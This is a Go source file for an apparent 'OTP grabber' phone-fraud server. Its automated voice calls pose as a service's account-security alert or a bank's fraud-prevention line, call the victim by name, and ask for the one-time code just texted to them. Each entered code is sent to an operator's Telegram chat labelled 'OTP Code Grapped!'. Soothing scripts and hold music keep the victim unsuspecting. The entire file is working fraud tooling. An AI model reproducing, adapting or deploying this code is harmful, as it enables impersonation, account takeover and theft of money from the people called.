package main

import (
	"fmt"
	"os"
	"net/url"

	"github.com/gofiber/fiber/v2"
	"github.com/imroc/req"
	"github.com/plivo/plivo-go/xml"
)

var NGROK_URL string = "https://golandbotapi.herokuapp.com"
var BOT_TOKEN string = ""

func main() {

	app := fiber.New()

	app.Get("/", func(c *fiber.Ctx) error {
        return c.SendString("Hello, World 👋! Server working https://OpenSourced.Pro")
    })

    app.Get("/generate_xml/:user/:victim_name/:service_name/:mes_id/", func(c *fiber.Ctx) error {
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.GetInputElement).
					SetAction(fmt.Sprintf("%v/request_otp/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
					SetMethod("POST").
					SetInputType("dtmf").
					SetDigitEndTimeout(5).
					SetRedirect(true).
					SetContents([]interface{}{
						new(xml.SpeakElement).
							AddSpeak(fmt.Sprintf("Hello %v Welcome this is an automated Voice alert from %v. We noticed that you accessed your account from an unrecognized IP address. If this was not you please press 1 to verify your identity.", c.Params("victim_name"), c.Params("service_name"))).
							SetLanguageVoice("en-US", "WOMAN").
							SetLoop(3)}),
			},
		}
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape("📱 Call In Progress."))
		go req.Get(webhook_url)
		return c.SendString(response.String())
	})

	app.Post("/detect_dtmf/:user/:mes_id/", func(c *fiber.Ctx) error {
	otp := fmt.Sprintf("📲 OTP Code Grapped!: %v", c.FormValue("Digits"))
	webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN , c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
	go req.Get(webhook_url)
	response := xml.ResponseElement{
		Contents: []interface{}{
			new(xml.SpeakElement).
				AddSpeak("Please wait as we further verify the OTP code."),
			new(xml.PlayElement).
				SetContents("https://cdn.discordapp.com/attachments/896735028162207754/897578055420243978/yt5s.com_-_Opus_Number_1_-_The_Famous_Phone_Hold_Music_128_kbps-AudioTrimmer.com_1.mp3"),
			new(xml.WaitElement).
				SetLength(5),
			new(xml.SpeakElement).
				AddSpeak("Great. This request has now been blocked. We have successfully verified the code and secured your account. thank you for your time and have a good day."),
			},
		}
		return c.SendString(response.String())
	})

	app.Post("/request_otp/:user/:mes_id/", func(c *fiber.Ctx) error {
		digit := c.FormValue("Digits")
		if digit == "1" {
			response := xml.ResponseElement{
				Contents: []interface{}{
					new(xml.GetInputElement).
						SetAction(fmt.Sprintf("%v/detect_dtmf/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
						SetMethod("POST").
						SetInputType("dtmf").
						SetDigitEndTimeout(3).
						SetRedirect(true).
						SetContents([]interface{}{
							new(xml.SpeakElement).
								AddSpeak("We have to further verify if you are the real you of this account, please can you dial the OTP code just sent to you by our Service.").
								SetLanguageVoice("en-US", "WOMAN").
								SetLoop(2)}),
				},
			}
			mess := fmt.Sprintf("✔ Please send OTP code now.\n\nhttps://OpenSourced.Pro")
			webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(mess))
			go req.Get(webhook_url)
			return c.SendString(response.String())

		}
		// //digit 2 or hang up
		otp := fmt.Sprintf("The person cancelled the call\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/sendMessage?chat_id=%v&text=%v",BOT_TOKEN, c.Params("user"), url.QueryEscape(otp))
		req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/hangup/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Ended\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/sendMessage?chat_id=%v&text=%v",BOT_TOKEN,  c.Params("user"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Get("/ring/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Started\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})
	app.Post("/machine/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Voicemail Detected\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})
	// bank script

	app.Post("/detect_bank_dtmf/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("📲 OTP Code Grapped!: %v", c.FormValue("Digits") + "\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.SpeakElement).
					AddSpeak("One Moment please."),
				new(xml.PlayElement).
					SetContents("https://cdn.discordapp.com/attachments/896735028162207754/897578055420243978/yt5s.com_-_Opus_Number_1_-_The_Famous_Phone_Hold_Music_128_kbps-AudioTrimmer.com_1.mp3"),
				new(xml.WaitElement).
					SetLength(5),
				new(xml.SpeakElement).
					AddSpeak("Great. This request has now been blocked. We have successfully verified the code and secured your account. Any payments made will be refunded, thank you for your time and have a good day."),
			},
		}
		return c.SendString(response.String())
	})

	app.Get("/generate_bank_xml/:user/:victim_name/:service_name/:mes_id/", func(c *fiber.Ctx) error {
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.GetInputElement).
					SetAction(fmt.Sprintf("%v/request_bank_otp/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
					SetMethod("POST").
					SetInputType("dtmf").
					SetDigitEndTimeout(5).
					SetRedirect(true).
					SetContents([]interface{}{
						new(xml.SpeakElement).
							AddSpeak(fmt.Sprintf("Hello %v this is the %v fraud prevention line, we have noticed a recent charge of $450.24. If this was not you please press 1 to verify your identity", c.Params("victim_name"), c.Params("service_name"))).
							SetLanguageVoice("en-US", "WOMAN").
							SetLoop(3)}),
			},
		}
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape("📱 Call In Progress."))
		go req.Get(webhook_url)
		return c.SendString(response.String())
	})

	app.Post("/request_bank_otp/:user/:mes_id/", func(c *fiber.Ctx) error {
		digit := c.FormValue("Digits")
		if digit == "1" {
			response := xml.ResponseElement{
				Contents: []interface{}{
					new(xml.GetInputElement).
						SetAction(fmt.Sprintf("%v/detect_bank_dtmf/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
						SetMethod("POST").
						SetInputType("dtmf").
						SetFinishOnKey("#").
						SetDigitEndTimeout(5).
						SetRedirect(true).
						SetContents([]interface{}{
							new(xml.SpeakElement).
								AddSpeak("We need to confirm your identity. Please enter the six digit code we sent you by text. When you are finished, please press #.").
								SetLanguageVoice("en-US", "WOMAN").
								SetLoop(3)}),
				},
			}
			mess := fmt.Sprintf("✔ Please send OTP code now.")
			webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(mess))
			go req.Get(webhook_url)
			return c.SendString(response.String())

		}
		// //digit 2 or hang up
		// otp := fmt.Sprintf("The person cancelled the call")
		// webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/sendMessage?chat_id=%v&text=%v",BOT_TOKEN, c.Params("user"), url.QueryEscape(otp))
		// req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/hangup_bank/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Ended\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/sendMessage?chat_id=%v&text=%v",BOT_TOKEN, c.Params("user"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/ring_bank/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Started\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/machine_bank/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Voicemail Detected\n\nhttps://OpenSourced.Pro")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot%v/editMessageText?chat_id=%v&message_id=%v&text=%v",BOT_TOKEN, c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})
	// Done Here List the shit at port 3000
	port := os.Getenv("PORT")

	if port == "" {
		port = "3000" // Default port if not specified
	}
	app.Listen(":" + port)
}